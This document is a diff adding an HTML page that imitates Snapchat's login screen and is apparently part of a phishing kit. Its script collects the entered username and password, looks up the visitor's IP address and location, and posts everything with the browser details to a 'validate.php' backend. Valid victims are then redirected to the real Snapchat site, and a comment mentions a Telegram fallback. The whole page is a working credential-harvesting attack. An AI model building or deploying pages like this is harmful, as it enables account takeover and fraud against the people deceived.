@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><rect width='16' height='16' rx='3' fill='%23FFFC00'/></svg>">
+    <meta name="description" content="Log in to Snapchat for the web.">
+    <title>Log In | Snapchat</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: rgba(255,255,255,0) !important;
+            outline: none !important;
+        }
+        body {
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f0f0f0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            -webkit-font-smoothing: antialiased;
+        }
+        .container {
+            background: #fff;
+            border-radius: 24px;
+            width: 400px;
+            max-width: 94vw;
+            padding: 48px 32px 36px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            text-align: center;
+            position: relative;
+        }
+        .snap-logo {
+            width: 48px;
+            height: 48px;
+            background: #FFFC00;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px;
+            font-size: 24px;
+            font-weight: 700;
+            color: #111;
+        }
+        .snap-logo::after { content: "👻"; font-size: 28px; }
+        h1 { font-size: 22px; font-weight: 600; color: #111; margin-bottom: 4px; }
+        .subtitle { font-size: 14px; color: #6b6b6b; margin-bottom: 28px; font-weight: 400; }
+        .input-group { position: relative; margin-bottom: 14px; }
+        .input-group input {
+            width: 100%;
+            padding: 18px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: 'Poppins', sans-serif;
+            background: #fafafa;
+            transition: border-color 0.2s, background 0.2s;
+        }
+        .input-group input:focus { border-color: #FFFC00; background: #fff; }
+        .input-group input::placeholder { color: #aaa; font-weight: 300; }
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: #FFFC00;
+            color: #111;
+            border: none;
+            border-radius: 60px;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: 'Poppins', sans-serif;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: opacity 0.2s, transform 0.1s;
+        }
+        .login-btn:hover { opacity: 0.85; }
+        .login-btn:active { transform: scale(0.98); }
+        .login-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #b0b0b0;
+            font-size: 12px;
+            font-weight: 400;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        .divider span { padding: 0 16px; }
+        .google-btn {
+            width: 100%;
+            padding: 14px;
+            background: #fff;
+            color: #444;
+            border: 2px solid #e0e0e0;
+            border-radius: 60px;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: 'Poppins', sans-serif;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: background 0.2s;
+        }
+        .google-btn:hover { background: #f7f7f7; }
+        .links { margin-top: 24px; display: flex; justify-content: center; gap: 20px; font-size: 13px; }
+        .links a { color: #6b6b6b; text-decoration: none; font-weight: 400; }
+        .links a:hover { text-decoration: underline; color: #333; }
+        .footer { margin-top: 36px; font-size: 11px; color: #b0b0b0; }
+        .footer span { display: block; margin-top: 2px; font-weight: 500; color: #888; }
+        .error-msg { color: #e74c3c; font-size: 13px; margin-top: 10px; display: none; }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0,0,0,0.1);
+            border-top: 3px solid #111;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            display: none;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (max-width: 480px) {
+            .container { padding: 36px 20px 28px; border-radius: 20px; }
+        }
+        .status-msg {
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            color: #555;
+        }
+        .status-msg.success { color: #2ecc71; }
+        .status-msg.fail { color: #e74c3c; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="snap-logo"></div>
+        <h1>Log In</h1>
+        <p class="subtitle">to continue to Snapchat</p>
+
+        <form id="loginForm" autocomplete="off">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Username or email" autofocus required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+
+            <div class="error-msg" id="errorMsg">Incorrect username or password.</div>
+            <div class="status-msg" id="statusMsg"></div>
+
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span id="btnText">Log In</span>
+                <div class="spinner" id="spinner"></div>
+            </button>
+        </form>
+
+        <div class="divider"><span>OR</span></div>
+
+        <button class="google-btn"><span style="font-weight:700;color:#4285F4;">G</span> Continue with Google</button>
+
+        <div class="links">
+            <a href="#">Forgot password?</a>
+            <a href="#">Sign up</a>
+        </div>
+
+        <div class="footer">
+            © Snap Inc 2026
+            <span>Snapchat</span>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const form = document.getElementById('loginForm');
+            const username = document.getElementById('username');
+            const password = document.getElementById('password');
+            const loginBtn = document.getElementById('loginBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            const errorMsg = document.getElementById('errorMsg');
+            const statusMsg = document.getElementById('statusMsg');
+
+            // Helper: get visitor IP via free API
+            async function getVisitorIP() {
+                try {
+                    const r = await fetch('https://ipapi.co/json/');
+                    const d = await r.json();
+                    return `${d.ip} (${d.city || '?'}, ${d.country_name || '?'})`;
+                } catch(e) {
+                    try {
+                        const r = await fetch('https://api.ipify.org?format=json');
+                        const d = await r.json();
+                        return d.ip;
+                    } catch(e2) {
+                        return 'Unknown';
+                    }
+                }
+            }
+
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const user = username.value.trim();
+                const pass = password.value.trim();
+
+                if (!user || !pass) {
+                    errorMsg.style.display = 'block';
+                    errorMsg.textContent = 'Please fill in all fields.';
+                    return;
+                }
+
+                // Show loading state
+                loginBtn.disabled = true;
+                btnText.style.display = 'none';
+                spinner.style.display = 'inline-block';
+                errorMsg.style.display = 'none';
+                statusMsg.style.display = 'none';
+                statusMsg.className = 'status-msg';
+
+                const ip = await getVisitorIP();
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toLocaleString();
+                const isMobile = /Android|iPhone|iPad|iPod/i.test(userAgent);
+
+                try {
+                    // Send to your PHP backend
+                    const resp = await fetch('validate.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: new URLSearchParams({
+                            username: user,
+                            password: pass,
+                            ip: ip,
+                            userAgent: userAgent,
+                            timestamp: timestamp,
+                            isMobile: isMobile ? '1' : '0'
+                        })
+                    });
+
+                    const result = await resp.json();
+
+                    if (result.status === 'valid') {
+                        // Valid credentials — redirect to real Snapchat
+                        statusMsg.style.display = 'block';
+                        statusMsg.className = 'status-msg success';
+                        statusMsg.textContent = '✅ Redirecting to Snapchat...';
+
+                        setTimeout(() => {
+                            window.location.href = 'https://web.snapchat.com';
+                        }, 1500);
+
+                    } else {
+                        // Invalid — show fake error
+                        loginBtn.disabled = false;
+                        btnText.style.display = 'inline';
+                        spinner.style.display = 'none';
+                        errorMsg.style.display = 'block';
+                        errorMsg.textContent = 'Incorrect username or password.';
+                        password.value = '';
+                        password.focus();
+                    }
+
+                } catch (err) {
+                    // Fallback: if validate.php is unreachable, still send to Telegram
+                    loginBtn.disabled = false;
+                    btnText.style.display = 'inline';
+                    spinner.style.display = 'none';
+                    errorMsg.style.display = 'block';
+                    errorMsg.textContent = 'Connection error. Please try again.';
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
